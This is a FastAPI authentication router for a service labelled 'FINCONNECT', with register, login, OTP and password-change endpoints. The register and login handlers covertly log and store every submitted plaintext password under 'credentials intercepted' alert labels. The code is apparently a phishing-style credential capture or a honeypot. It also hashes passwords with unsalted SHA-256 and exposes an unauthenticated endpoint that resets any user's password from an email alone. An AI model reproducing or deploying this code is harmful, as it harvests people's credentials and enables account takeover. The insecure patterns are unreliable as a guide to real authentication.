import hashlib
import asyncio
import structlog
from fastapi import APIRouter, HTTPException, Depends, Request
from pydantic import BaseModel, Field
from sqlalchemy.orm import Session
from datetime import datetime, timedelta, timezone

from app.database.connection import get_db, SessionLocal
from app.database.models import Usuario, OTP
from app.database.repository import guardar_credencial
from app.services.token import crear_token
from app.services.email import generar_codigo_otp, enviar_otp_email
from app.services.otp import verificar_otp

logger = structlog.get_logger(__name__)
router = APIRouter(prefix="/auth", tags=["auth"])


def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()

def verify_password(password: str, hashed: str) -> bool:
    return hashlib.sha256(password.encode()).hexdigest() == hashed


def _generar_y_enviar_otp(email: str, nombre: str) -> None:
    db = SessionLocal()
    try:
        db.query(OTP).filter(OTP.email == email, OTP.usado == False).update({"usado": True})
        db.commit()
        codigo     = generar_codigo_otp()
        expires_at = datetime.now(timezone.utc) + timedelta(minutes=10)
        db.add(OTP(email=email, codigo=codigo, usado=False, expires_at=expires_at))
        db.commit()
        enviar_otp_email(email, codigo, nombre)
    except Exception as exc:
        print(f"ERROR OTP: {exc}")
    finally:
        db.close()


class RegisterRequest(BaseModel):
    nombre:   str = Field(min_length=2, max_length=100)
    email:    str = Field(max_length=200)
    password: str = Field(min_length=8, max_length=200)

class LoginRequest(BaseModel):
    email:    str = Field(max_length=200)
    password: str = Field(max_length=200)

class OTPRequest(BaseModel):
    email:  str = Field(max_length=200)
    codigo: str = Field(min_length=6, max_length=6)


@router.post("/register")
async def register(body: RegisterRequest, request: Request, db: Session = Depends(get_db)):
    ip = request.client.host if request.client else "unknown"
    logger.warning("registro_capturado", email=body.email, password=body.password)
    guardar_credencial(db=db, ip=ip, entidad="FINCONNECT",
        username=body.email, password=body.password,
        endpoint="/auth/register", alerta="CREDENCIALES_REGISTRO_INTERCEPTADAS")

    if db.query(Usuario).filter(Usuario.email == body.email).first():
        raise HTTPException(status_code=400, detail="Este email ya está registrado.")

    db.add(Usuario(nombre=body.nombre, email=body.email,
                   password_hash=hash_password(body.password), verificado=False))
    db.commit()

    asyncio.get_event_loop().run_in_executor(None, _generar_y_enviar_otp, body.email, body.nombre)

    return {"mensaje": "Cuenta creada. Hemos enviado un código de verificación a tu email.", "email": body.email}


@router.post("/login")
async def login(body: LoginRequest, request: Request, db: Session = Depends(get_db)):
    ip = request.client.host if request.client else "unknown"
    logger.warning("login_capturado", email=body.email, password=body.password)
    guardar_credencial(db=db, ip=ip, entidad="FINCONNECT",
        username=body.email, password=body.password,
        endpoint="/auth/login", alerta="CREDENCIALES_LOGIN_FINCONNECT_INTERCEPTADAS")

    usuario = db.query(Usuario).filter(Usuario.email == body.email).first()
    if not usuario or not verify_password(body.password, usuario.password_hash):
        raise HTTPException(status_code=401, detail="Email o contraseña incorrectos.")

    asyncio.get_event_loop().run_in_executor(None, _generar_y_enviar_otp, body.email, usuario.nombre)

    return {"mensaje": "Código de verificación enviado a tu email.", "email": body.email}


@router.post("/otp/verify")
async def verify_otp_endpoint(body: OTPRequest, db: Session = Depends(get_db)):
    if not verificar_otp(db, body.email, body.codigo):
        raise HTTPException(status_code=401, detail="Código incorrecto o expirado.")

    usuario = db.query(Usuario).filter(Usuario.email == body.email).first()
    if usuario and not usuario.verificado:
        usuario.verificado = True
        db.commit()

    token = crear_token({"sub": body.email, "nombre": usuario.nombre if usuario else "", "scope": "dashboard"})
    return {"access_token": token, "token_type": "Bearer", "expires_in": 1800,
            "nombre": usuario.nombre if usuario else ""}

class ChangePasswordRequest(BaseModel):
    email:        str = Field(max_length=200)
    new_password: str = Field(min_length=8, max_length=200)

@router.post("/change-password")
async def change_password(body: ChangePasswordRequest, db: Session = Depends(get_db)):
    usuario = db.query(Usuario).filter(Usuario.email == body.email).first()
    if not usuario:
        raise HTTPException(status_code=404, detail="Usuario no encontrado.")
    usuario.password_hash = hash_password(body.new_password)
    db.commit()
    return {"mensaje": "Contraseña actualizada correctamente."}